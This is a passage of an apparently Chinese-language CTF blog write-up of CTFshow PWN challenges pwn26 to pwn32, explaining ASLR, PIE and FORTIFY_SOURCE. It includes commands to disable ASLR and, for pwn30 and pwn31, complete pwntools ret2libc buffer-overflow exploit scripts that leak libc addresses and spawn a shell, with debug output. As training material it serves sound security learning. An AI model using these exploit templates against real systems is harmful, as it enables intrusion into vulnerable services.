<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Please confirm your ASLR level first !</span><br><span class="line">    * *************************************</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">2</span><br><span class="line">If the result is 0, <span class="keyword">then</span> you get the correct flag!</span><br><span class="line">If not,you will get a fake flag!</span><br><span class="line">flag is :ctfshow&#123;0x400687_0x400560_0xc45b2a0_0x76042988a6b0&#125;</span><br><span class="line">$ <span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space</span><br><span class="line">2</span><br><span class="line">rhea@rhea-VMware-Virtual-Platform:~$ <span class="built_in">sudo</span> docker run -it --privileged --<span class="built_in">rm</span> pwnenv_ubuntu24 /bin/bash</span><br><span class="line">root@5c9e7214e2da:/# <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">root@5c9e7214e2da:/# <span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space</span><br><span class="line">0</span><br><span class="line">$ ./pwn</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">0</span><br><span class="line">If the result is 0, <span class="keyword">then</span> you get the correct flag!</span><br><span class="line">If not,you will get a fake flag!</span><br><span class="line">flag is :ctfshow&#123;0x400687_0x400560_0x6032a0_0x7ffff7fbd6b0&#125;</span><br></pre></td></tr></table></figure>

<p>所以应该先执行echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space[不行的话 sudo sh -c ‘echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space’重定向]</p>
<p>再运行程序即可得到正确的flag</p>
<p>flag:ctfshow{0x400687_0x400560_0x603260_0x7ffff7fd64f0}</p>
<h6 id="分析过程：-9"><a href="#分析过程：-9" class="headerlink" title="分析过程："></a>分析过程：</h6><p>ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加</p>
<p>软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的</p>
<p>位置，从而增加了利用软件漏洞进行攻击的难度。</p>
<p>开启不同等级会有不同的效果：</p>
<ol>
<li>内存布局随机化： ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的</li>
</ol>
<p>库和模块通常会在固定的内存位置上加载，攻击者可以利用这种可预测性来定位和利用漏洞。</p>
<p>ASLR通过随机化这些模块的加载地址，使得攻击者无法准确地确定内存中的关键数据结构和</p>
<p>代码的位置。</p>
<ol start="2">
<li>地址空间范围的随机化： ASLR还会随机化进程的地址空间范围。在传统的地址空间中，栈、</li>
</ol>
<p>堆、代码段和数据段通常会被分配到固定的地址范围中。ASLR会随机选择地址空间的起始位</p>
<p>置和大小，从而使得这些重要的内存区域在每次运行时都有不同的位置。</p>
<ol start="3">
<li>随机偏移量： ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着</li>
</ol>
<p>每个模块的实际地址是相对于一个随机基址偏移的，而不是绝对地址。攻击者需要在运行时发</p>
<p>现这些偏移量，才能准确地定位和利用漏洞。</p>
<ol start="4">
<li>堆和栈随机化： ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起</li>
</ol>
<p>始地址，使得攻击者无法准确地预测堆上对象的位置。栈随机化会随机选择栈帧的起始位置，</p>
<p>使得攻击者无法轻易地覆盖返回地址或控制程序流程。</p>
<p>在Linux中，ALSR的全局配置&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space有三种情况：</p>
<p>0表示关闭ALSR</p>
<p>1表示部分开启（将mmap的基址、stack和vdso页面随机化）</p>
<p>2表示完全开启</p>
<hr>
<table>
<thead>
<tr>
<th><strong>ALSR</strong></th>
<th><strong>Executable</strong></th>
<th><strong>PLT</strong></th>
<th>Heap</th>
<th><strong>Stack</strong></th>
<th>Shared libraies</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
<tr>
<td>1</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>2</td>
<td>×</td>
<td>×</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>2+PIE</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
</tbody></table>
<hr>
<h2 id="pwn27"><a href="#pwn27" class="headerlink" title="pwn27"></a>pwn27</h2><p>Hint：设置好 ALSR 保护参数值即可获得flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Please confirm your ASLR level first !</span><br><span class="line">    * *************************************</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">0</span><br><span class="line">If the result is 0 or 1, <span class="keyword">then</span> you get the correct flag!</span><br><span class="line">If not,you will get a fake flag!</span><br><span class="line">flag is :ctfshow&#123;0x400687_0x400560_0x6032a0&#125;</span><br></pre></td></tr></table></figure>

<p>故flag:ctfshow{0x400687_0x400560_0x603260_0x7ffff7fd64f0}</p>
<h6 id="分析过程：-10"><a href="#分析过程：-10" class="headerlink" title="分析过程："></a>分析过程：</h6><p>同理pwn26</p>
<h2 id="pwn28"><a href="#pwn28" class="headerlink" title="pwn28"></a>pwn28</h2><p>Hint：设置好 ALSR 保护参数值即可获得flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Please confirm your ASLR level first !</span><br><span class="line">    * *************************************</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">0</span><br><span class="line">flag is :ctfshow&#123;0x400687_0x400560&#125;</span><br><span class="line">...</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">1</span><br><span class="line">flag is :ctfshow&#123;0x400687_0x400560&#125;</span><br><span class="line">...</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">2</span><br><span class="line">flag is :ctfshow&#123;0x400687_0x400560&#125;</span><br></pre></td></tr></table></figure>

<p>此时不管等级为0 1 2 ，函数本身地址不会变化（在未开启PIE的情况下）</p>
<p>故flag:ctfshow{0x400687_0x400560}</p>
<h6 id="分析过程：-11"><a href="#分析过程：-11" class="headerlink" title="分析过程："></a>分析过程：</h6><p>同理pwn26</p>
<h2 id="pwn29"><a href="#pwn29" class="headerlink" title="pwn29"></a>pwn29</h2><p>Hint：ASLR和PIE开启后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Please confirm your ASLR level first !</span><br><span class="line">    * *************************************</span><br><span class="line">sh: 1: cannot create /proc/sys/kernel/randomize_va_space: Read-only file system</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">0</span><br><span class="line">Let<span class="string">&#x27;s take a look at protection:</span></span><br><span class="line"><span class="string">[*] &#x27;</span>/CTFshow_pwn/pwn<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    Arch:       amd64-64-little</span></span><br><span class="line"><span class="string">    RELRO:      Full RELRO</span></span><br><span class="line"><span class="string">    Stack:      Canary found</span></span><br><span class="line"><span class="string">    NX:         NX enabled</span></span><br><span class="line"><span class="string">    PIE:        PIE enabled</span></span><br><span class="line"><span class="string">    Stripped:   No</span></span><br><span class="line"><span class="string">executable: 0x55555540083a</span></span><br><span class="line"><span class="string">system@plt: 0x7ffff7df3750</span></span><br><span class="line"><span class="string">heap: 0x5555556032a0</span></span><br><span class="line"><span class="string">stack: 0x7fffffffe3d4</span></span><br><span class="line"><span class="string">As you can see, the protection has been fully turned on and the address has been completely randomized!</span></span><br><span class="line"><span class="string">Here is your flag:</span></span><br><span class="line"><span class="string">ctfshow&#123;Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!&#125;</span></span><br></pre></td></tr></table></figure>

<p>故flag：ctfshow{Address_Space_Layout_Randomization&amp;&amp;Position Independent_Executable_1s_C0000000000l!}</p>
<h6 id="分析过程：-12"><a href="#分析过程：-12" class="headerlink" title="分析过程："></a>分析过程：</h6><p>ASLR和PIE开启后，地址都会将随机化，这里值得注意的是，由于粒度问题，虽然地址都被随机化</p>
<p>了，但是被随机化的都仅仅是某个对象的起始地址，而在其内部还是原来的结构，也就是相对偏移是不</p>
<p>会变化的。</p>
<h2 id="pwn30"><a href="#pwn30" class="headerlink" title="pwn30"></a>pwn30</h2><p>Hint：关闭PIE后,程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28145)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;)</span></span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">140</span> +p32(elf.sym[<span class="string">&#x27;write&#x27;</span>]) + p32(ctfshow) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload2 = <span class="string">b&quot;B&quot;</span> * <span class="number">140</span> + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span> argv=[b<span class="string">&#x27;./pwn&#x27;</span>] : pid 756</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] <span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">[DEBUG] Sent 0xa0 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class="line">    *</span><br><span class="line">    00000080  41 41 41 41  41 41 41 41  41 41 41 41  b0 83 04 08  │AAAA│AAAA│AAAA│····│</span><br><span class="line">    00000090  f6 84 04 08  01 00 00 00  18 a0 04 08  04 00 00 00  │····│····│····│····│</span><br><span class="line">    000000a0</span><br><span class="line">[DEBUG] Received 0x4 bytes:</span><br><span class="line">    00000000  80 1b e9 f7                                         │····│</span><br><span class="line">    00000004</span><br><span class="line">/CTFshow_pwn/exp.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  binsh_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + next(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">[DEBUG] Sent 0x98 bytes:</span><br><span class="line">    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│</span><br><span class="line">    *</span><br><span class="line">    00000080  42 42 42 42  42 42 42 42  42 42 42 42  30 a4 dc f7  │BBBB│BBBB│BBBB│0···│</span><br><span class="line">    00000090  f6 84 04 08  e8 ed f3 f7                            │····│····│</span><br><span class="line">    00000098</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b<span class="string">&#x27;ls\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0xb bytes:</span><br><span class="line">    b<span class="string">&#x27;exp.py\tpwn\n&#x27;</span></span><br><span class="line">exp.py	pwn</span><br></pre></td></tr></table></figure>

<h6 id="分析过程：-13"><a href="#分析过程：-13" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位程序开启NX，部分开启RELRO保护</p>
<p>IDA查看跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">132</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里存在明显的溢出点</p>
<p>buf ，用于存储从标准输入读取的数据。该变量在栈上分配，相对于函数栈帧指针 ebp 的偏移为-0x88 。调用 read 函数从标准输入读取数据。 read 函数的第一个参数是文件描述符，这里使用 0 表示标准输入。第二个参数是指向存储数据的缓冲区的指针，这里是 &amp;buf 。第三个参数是要读取的最大字节数，这里是 0x100u ，即 256 字节。</p>
<p>程序中无system也没有“&#x2F;bin&#x2F;sh”字符串，也可以使用ret2libc的方法进行get shell 后面到该部分会进行详细讲解，同样在这里仅仅是为了演示在关闭Canary和PIE保护，开启NX保护时的一种攻击手法。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ gdb ./pwn</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">^c</span><br><span class="line">pwndbg&gt; cyclic 500</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae</span><br><span class="line">*EIP  0x6261616b (<span class="string">&#x27;kaab&#x27;</span>)</span><br><span class="line">pwndbg&gt; cyclic -l kaab</span><br><span class="line">Finding cyclic pattern of 4 bytes: b<span class="string">&#x27;kaab&#x27;</span> (hex: 0x6b616162)</span><br><span class="line">Found at offset 140</span><br></pre></td></tr></table></figure>

<h2 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h2><p>Hint：开启 ALSR 和 PIE 的情况下，仍可能被利用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;127.0.0.1&#x27;,10000)</span></span><br><span class="line"><span class="comment">#io = remote(&quot;pwn.challenge.ctf.show&quot;,28161)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;)</span></span><br><span class="line">main = <span class="built_in">int</span>(io.recvline(),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#print hex(main)</span></span><br><span class="line">base = main - elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ctfshow = base + elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">write_plt = base + elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = base + elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ebx = base + <span class="number">0x1fc0</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">132</span> + p32(ebx) + <span class="string">b&quot;AAAA&quot;</span> + p32(write_plt) + p32(ctfshow) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">write = u32(io.recv())</span><br><span class="line">libc_base = write - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&quot;B&quot;</span> * <span class="number">140</span> + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">   $ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span> argv=[b<span class="string">&#x27;./pwn&#x27;</span>] : pid 781</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] <span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">[DEBUG] Received 0xb bytes:</span><br><span class="line">    b<span class="string">&#x27;0x56555652\n&#x27;</span></span><br><span class="line">[DEBUG] Sent 0xa0 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class="line">    *</span><br><span class="line">    00000080  41 41 41 41  c0 6f 55 56  41 41 41 41  b0 54 55 56  │AAAA│·oUV│AAAA│·TUV│</span><br><span class="line">    00000090  1d 56 55 56  01 00 00 00  dc 6f 55 56  04 00 00 00  │·VUV│····│·oUV│····│</span><br><span class="line">    000000a0</span><br><span class="line">[DEBUG] Received 0x4 bytes:</span><br><span class="line">    00000000  80 1b e9 f7                                         │····│</span><br><span class="line">    00000004</span><br><span class="line">/CTFshow_pwn/exp.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  binsh_addr = libc_base + next(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">[DEBUG] Sent 0x98 bytes:</span><br><span class="line">    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│</span><br><span class="line">    *</span><br><span class="line">    00000080  42 42 42 42  42 42 42 42  42 42 42 42  30 a4 dc f7  │BBBB│BBBB│BBBB│0···│</span><br><span class="line">    00000090  1d 56 55 56  e8 ed f3 f7                            │·VUV│····│</span><br><span class="line">    00000098</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b<span class="string">&#x27;ls\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0xb bytes:</span><br><span class="line">    b<span class="string">&#x27;exp.py\tpwn\n&#x27;</span></span><br><span class="line">exp.py	pwn</span><br></pre></td></tr></table></figure>

<h6 id="分析过程：-14"><a href="#分析过程：-14" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec查看保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位程序仅关闭Canary保护</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, main);</span><br><span class="line">  ctfshow(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(asc_854);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8C8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_944);</span><br><span class="line">  <span class="built_in">puts</span>(asc_9D0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_A60);</span><br><span class="line">  <span class="built_in">puts</span>(asc_AE4);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B78);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : Bypass ALSR &amp; PIE &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Hello CTFshow!\n&quot;</span>, <span class="number">0xEu</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到程序先打印出main函数的地址，然后跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">132</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的，这里还是有溢出，但是开启了保护不同了，使用上一题的exp肯定是打不了了</p>
<p>既然程序已经给我们main函数的地址了，那么我们就可以通过计算偏移得到程序本身的加载地址</p>
<p>这也就是与上一题不同的地方</p>
<h2 id="pwn32"><a href="#pwn32" class="headerlink" title="pwn32"></a>pwn32</h2><p>Hint：FORTIFY_SOURCE&#x3D;0：禁用 Fortify 功能。 不会进行任何额外的安全检查。 可能导致潜在的安全漏洞。ssh <a href="mailto:&#99;&#x74;&#102;&#x73;&#x68;&#x6f;&#119;&#x40;&#x70;&#x77;&#110;&#46;&#x63;&#x68;&#x61;&#108;&#108;&#101;&#110;&#x67;&#x65;&#x2e;&#x63;&#116;&#x66;&#46;&#115;&#104;&#x6f;&#119;">ctfshow@pwn.challenge.ctf.show</a> -p28177</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FORTIFY_SOURCE 是一个 C/C++ 编译器提供的安全保护机制，旨在防止缓冲区溢出和其他与字符串和内存操作相关的安全漏洞。它是在编译时自动插入的一组额外代码，用于增强程序对于缓冲区溢出和其他常见安全问题的防护。</span><br><span class="line">FORTIFY_SOURCE 提供了以下主要功能：</span><br><span class="line">1. 运行时长度检查：FORTIFY_SOURCE 会在编译时自动将长度检查代码插入到一些危险的库函数中，例如strcpy 、 strcat 、 sprintf 等。这些代码会检查目标缓冲区的长度，以确保操作不会导致溢出。如果检测到溢出情况，程序会立即终止，从而防止潜在的漏洞利用。</span><br><span class="line">2. 缓冲区溢出检测：FORTIFY_SOURCE 还会将额外的保护机制添加到一些敏感的库函数中，例如 memcpy、memmove 、 memset 等。这些机制可以检测传递给这些函数的源和目标缓冲区是否有重叠，并防止潜在的缓冲区溢出。</span><br><span class="line">3. 安全警告和错误报告：当 FORTIFY_SOURCE 检测到潜在的缓冲区溢出或其他安全问题时，它会生成相应的警告和错误报告。</span><br><span class="line">FORTIFY_SOURCE 提供了一层额外的安全保护，它可以在很大程度上减少常见的缓冲区溢出和字符串操作相关的安全漏洞。</span><br><span class="line">`**运行时检测到溢出会调用 abort() 终止程序，避免漏洞被利用。**`</span><br><span class="line">printf、sprintf、fprintf等）的格式化字符串占位符:</span><br><span class="line">1.%p：以十六进制形式输出指针（内存地址）的值，通常用于调试。</span><br><span class="line">2.%n：不输出内容，而是将当前已输出的字符数写入对应的参数（指针）位置。</span><br><span class="line"> 变种：</span><br><span class="line">	%hn：写入 2 字节（short类型）。</span><br><span class="line">	%hhn：写入 1 字节（char类型）。</span><br><span class="line">	%ln：写入 8 字节（long类型，64 位系统）。</span><br><span class="line">3.%2$x：输出第 2 个参数的值，以十六进制形式表示。</span><br><span class="line">	$：指定参数位置（1\(表示第1个参数，2\)表示第 2 个，依此类推）。</span><br><span class="line">	x：以小写十六进制输出。</span><br></pre></td></tr></table></figure>

